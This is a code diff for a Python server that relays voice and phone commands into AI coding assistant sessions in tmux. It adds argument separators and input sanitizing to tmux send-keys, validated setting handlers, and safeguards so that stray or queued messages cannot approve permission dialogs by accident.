-            "tmux", "send-keys", "-t", tmux_session, "C-c",
+            "tmux", "send-keys", "-t", tmux_session, "--", "C-c",
             stdout=asyncio.subprocess.DEVNULL,
             stderr=asyncio.subprocess.DEVNULL,
             env=get_subprocess_env(),
@@ -2084,7 +2942,11 @@ async def _handle_kill_session(data: dict, ws: WebSocket) -> None:
     # Remove any registered sessions that reference this tmux session
     for sid, s in list(sessions.get_all_sessions().items()):
         if s.tmux_target and s.tmux_target.split(":")[0] == tmux_session:
-            _STICKY_ACTIVITY.pop(sid, None)
+            # ``remove_session`` forgets the per-session books. This site used
+            # to pop only _STICKY_ACTIVITY, so a killed session's id stayed in
+            # _LAST_CHOICE_FOR_SESSION -- and so in state_sync's
+            # active_choice_sessions, which clients prune against, leaving a
+            # decision card for a session that no longer exists.
             await _cancel_terminal_subs_for_session(sid, project=s.project)
             sessions.remove_session(sid)
 
@@ -2115,6 +2977,61 @@ async def _handle_kill_session(data: dict, ws: WebSocket) -> None:
 # ---------------------------------------------------------------------------
 # Verbosity control
 # ---------------------------------------------------------------------------
+
+
+async def _handle_set_client_setting(ws, data: dict) -> None:
+    """Set a display setting and push it to every client.
+
+    The setting belongs to the bridge, not to the device that asked: a voice
+    command is heard by a phone but is *about* the glasses, which are a
+    different device. Holding it here is also what lets a client that was
+    disconnected converge -- ``state_sync`` carries the current values, so a
+    returning client does not come back on the wrong theme and stay there.
+
+    An unknown name or value is rejected with an error rather than ignored.
+    These values are broadcast verbatim to every client; silently accepting an
+    arbitrary one would put an arbitrary string on four devices.
+    """
+    import bridge.server_state as _state
+
+    name = data.get("setting")
+    value = data.get("value")
+    if not isinstance(name, str) or not isinstance(value, str) or not _state.set_client_setting(name, value):
+        try:
+            await send_signed(ws, {
+                "type": "error",
+                "message": f"Unknown client setting {name!r}={value!r}",
+            })
+        except Exception:
+            pass
+        return
+
+    await _state.broadcast_to_ios({
+        "type": "client_setting",
+        "setting": name,
+        "value": value,
+    })
+    log_event("info", "bridge", f"Client setting {name} → {value}")
+
+
+async def _handle_speech_floor(ws, data: dict) -> None:
+    """A headset takes, renews or releases the speech floor.
+
+    While it holds the floor, narration is the headset's alone: the Mac and the
+    phones stay quiet. Every client learns of a change through ``state_sync``;
+    a renewal changes nothing, so it says nothing. ``claim`` must be a JSON
+    boolean -- a stray string must not silence two devices.
+    """
+    claim = data.get("claim")
+    if not isinstance(claim, bool):
+        try:
+            await send_signed(ws, {"type": "error", "message": "speech_floor needs claim: true or false"})
+        except Exception:
+            pass
+        return
+    if _state.claim_speech_floor(claim, holder=ws):
+        log_event("info", "bridge", "Speech floor " + ("taken by a headset" if claim else "released"))
+        await broadcast_to_ios(_state._state_sync_msg())
 
 
 async def _handle_set_verbosity(data: dict) -> None:
@@ -2246,6 +3163,26 @@ async def handle_voice_command(data: dict, websocket: WebSocket) -> None:
         )
         return
 
+    # What the wearer pointed at in the Reader, expanded into this
+    # assistant's own idiom. Before the queue, so a
+    # busy session queues the words it will actually receive; and refused
+    # whole, not sent bare -- "what does this do?" without the "this" would
+    # be a question about nothing.
+    if data.get("reference") is not None:
+        try:
+            message = _sanitize_message(reader.expand_reference(
+                message, data["reference"], normalize_assistant(session.assistant),
+                reader.project_root(session.project_dir or ""),
+            ))
+        except reader.ReaderError as exc:
+            await send_signed(websocket, {
+                "type": "error",
+                "session_id": session.session_id,
+                "message": f"Couldn't send what you pointed at: {exc.message}",
+            })
+            log_event("error", target_project, f"Reference refused: {exc.message}")
+            return
+
     # Rate limit check
     if not _check_dispatch_rate(session.session_id):
         await send_signed(websocket,{
@@ -2254,6 +3191,21 @@ async def handle_voice_command(data: dict, websocket: WebSocket) -> None:
         })
         log_event("warning", target_project, "Command dispatch rate-limited")
         return
+
+    # A decision on screen is answered (or refused) now, before the queue.
+    # Status alone cannot be trusted to say "blocked": it becomes "waiting"
+    # only when a notification hook fires, so a session without one -- Codex,
+    # a discovered pane -- reads "active" while its permission dialog sits
+    # there. Queued, an approval would wait for an idle that never comes and
+    # then be typed into the prompt as text once the dialog was gone.
+    if session.tmux_target:
+        live_target, live_err = _validate_tmux_pane_target(session.tmux_target)
+        if not live_err and live_target and await _intercept_for_live_decision(
+            # A client sent this in response to the card it is showing, so it is
+            # allowed to be the answer — subject to the shown-prompt check.
+            session, live_target, message, may_answer=True,
+        ):
+            return
 
     # If session is busy, queue the command instead of rejecting.
     # Sending tmux send-keys while an assistant is working garbles the terminal,
@@ -2367,13 +3319,138 @@ async def _handle_dead_pane(
     await broadcast_to_ios(_state_sync_msg())
 
 
-async def _dispatch_agent(session_id: str, project_dir: str, message: str) -> None:
+async def _decision_on_screen(tmux_target: str) -> tuple:
+    """Capture the pane now and return ``(form, choice)`` if one is showing.
+
+    At most one is non-None; a form wins, as it does in the activity poll.
+    Deliberately a fresh capture rather than the poll's cache, which lags
+    by up to a poll interval: a widget that appeared a moment ago is
+    exactly the one a dispatch would otherwise type into.
+    """
+    lines = await _capture_clean_lines(tmux_target)
+    if not lines:
+        return None, None
+    from bridge.choice_detector import detect_choice_prompt, detect_question_form
+
+    form = detect_question_form(lines)
+    if form is not None:
+        return form, None
+    return None, detect_choice_prompt(lines)
+
+
+async def _intercept_for_live_decision(
+    session, tmux_target: str, message: str, *, may_answer: bool = False
+) -> bool:
+    """Keep typed text out of a select widget; turn approve/deny into a pick.
+
+    Returns True when the message was dealt with here and must NOT be typed.
+
+    ``may_answer`` is what separates a decision from a coincidence. Only a
+    message composed by a human who is looking at this prompt right now may
+    become an answer; everything else is refused and re-announced. Without it,
+    the word "yes" approved a permission dialog no matter where it came from:
+
+    - a queued message, composed minutes earlier about something else, answered
+      whatever dialog happened to be on screen when the queue drained;
+    - a REST dispatch from a script or a swarm worker did the same;
+    - and on the Mac the mic is opened by the announcement itself, with no wake
+      word, so any two-word utterance in the room ("go ahead", "do it") became a
+      ``tell`` aimed at the last-announced project and then an approval.
+
+    Even when ``may_answer`` is true the prompt must be the one the user was
+    actually shown -- see ``_commit_matches_shown``. The announcement names the
+    tool, so approving a dialog that replaced it would approve something the
+    speaker never heard.
+
+    Typing into a select widget does not do what the sender meant. The text
+    is ignored and the Enter after it confirms the highlighted option, which
+    on Claude Code's permission dialog is "Yes". Measured on 2.1.282: the
+    iOS card's ``/deny`` approved the command it was denying, and so would
+    any other message sent to a session blocked on permission.
+
+    - A plain approval or denial of a permission dialog commits that option
+      through the same arrow-key path a card commit uses.
+    - Anything else is refused, not typed, and the session goes back to
+      ``waiting``: the sender learns the agent is blocked on a question,
+      which is true, rather than hearing that their message was sent.
+
+    Legacy ``number``-mode prompts are left alone: those are an ordinary
+    input line under a numbered list, and typing is how they are answered.
+    """
+    form, choice = await _decision_on_screen(tmux_target)
+    if form is None and (choice is None or choice.input_mode != "tui_select"):
+        return False
+
+    from bridge.choice_detector import permission_reply_index
+
+    project = session.project
+    if choice is not None and may_answer:
+        idx = permission_reply_index(choice, message)
+        if idx is not None and not _commit_matches_shown(session.session_id, choice):
+            log_event(
+                "warning", project,
+                "Spoken reply ignored: the prompt on screen is not the one announced",
+            )
+            idx = None
+        if idx is not None:
+            await _send_tui_choice(tmux_target, choice, idx, project)
+            log_event(
+                "info", project,
+                f"Permission {'approved' if idx == 0 else 'denied'} by reply "
+                f"{message[:40]!r} → option {idx + 1}",
+            )
+            return True
+
+    what = (
+        "a permission prompt" if choice is not None and choice.kind == "permission"
+        else "a question on screen"
+    )
+    log_event("warning", project, f"Not typed — {what} is open: {message[:60]}")
+    sessions.update_status(session.session_id, "waiting", activity_type="approval")
+    await broadcast_to_ios({
+        "type": "error",
+        "session_id": session.session_id,
+        "message": f"{project} is waiting on {what} — answer it first. Nothing was sent.",
+    })
+    await broadcast_to_ios(_state_sync_msg())
+    return True
+
+
+async def _dispatch_agent(
+    session_id: str,
+    project_dir: str,
+    message: str,
+    *,
+    may_answer_decision: bool = False,
+) -> None:
     """Send a command to a session's configured assistant.
 
     If the session has a ``tmux_target``, types the message directly into
     the interactive terminal via ``tmux send-keys``. Otherwise falls back
     to assistant-specific resume commands when available.
+
+    Sanitizing here rather than in each caller is deliberate: this is the one
+    place every dispatch passes through -- the WebSocket, ``POST /api/command``,
+    the queue drain and the Mac voice loop -- and the REST path had no
+    sanitizer of its own, so raw ESC and CR reached the pane's tty.
     """
+    message = _sanitize_dispatch_text(message)
+    if not message:
+        # Every caller has already marked the session active and announced
+        # "Sending to X" by now, so returning quietly here left the phone and
+        # the lens showing work that was never typed, with no Stop hook ever
+        # coming to clear it -- the "stuck saying Sending to <project>" shape.
+        # Put the session back and say so instead.
+        log_event("warning", "bridge", "Dispatch dropped: message was empty after sanitizing")
+        sessions.update_status(session_id, "idle", activity_type="sleeping")
+        await broadcast_to_ios({
+            "type": "error",
+            "session_id": session_id,
+            "message": "Nothing to send — the message was empty.",
+        })
+        await broadcast_to_ios(_state_sync_msg())
+        return
+    may_answer_decision = bool(may_answer_decision)
     session = sessions.get_session(session_id)
 
     # Guard: session may have been pruned between the time dispatch was
@@ -2403,6 +3480,20 @@ async def _dispatch_agent(session_id: str, project_dir: str, message: str) -> No
             })
             return
 
+    # A select widget on screen changes what typing means: the text is
+    # ignored and the Enter after it picks whatever the cursor is on. On a
+    # permission dialog that is "Yes" -- so this runs before anything is
+    # typed, for every caller (voice, REST, the queue, the Mac voice loop).
+    #
+    # ``may_answer`` is passed through rather than defaulted: a decision that
+    # appeared AFTER the caller composed its message is not that message's to
+    # answer, so the queue drain and REST both arrive here as False and get the
+    # refuse-and-re-announce path instead of an approval.
+    if tmux_target and await _intercept_for_live_decision(
+        session, tmux_target, message, may_answer=may_answer_decision
+    ):
+        return
+
     # Increment pending dispatch counter — each outstanding voice dispatch
     # suppresses listen on its corresponding stop event.  This handles
     # rapid-fire commands correctly (counter tracks all in-flight dispatches).
@@ -2428,7 +3519,7 @@ async def _dispatch_agent(session_id: str, project_dir: str, message: str) -> No
             # result. (This is the "stuck saying Sending to WeaveHacks4" bug.)
             # Mirror the dead-pane handling the terminal poll loop already does.
             p1 = await asyncio.create_subprocess_exec(
-                "tmux", "send-keys", "-t", tmux_target, "-l", message,
+                "tmux", "send-keys", "-t", tmux_target, "-l", "--", message,
                 stdout=asyncio.subprocess.DEVNULL,
                 stderr=asyncio.subprocess.PIPE,
                 env=get_subprocess_env(),
@@ -2438,7 +3529,7 @@ async def _dispatch_agent(session_id: str, project_dir: str, message: str) -> No
                 await _handle_dead_pane(session_id, tmux_target, err1)
                 return
             p2 = await asyncio.create_subprocess_exec(
-                "tmux", "send-keys", "-t", tmux_target, "Enter",
+                "tmux", "send-keys", "-t", tmux_target, "--", "Enter",
                 stdout=asyncio.subprocess.DEVNULL,
                 stderr=asyncio.subprocess.PIPE,
                 env=get_subprocess_env(),
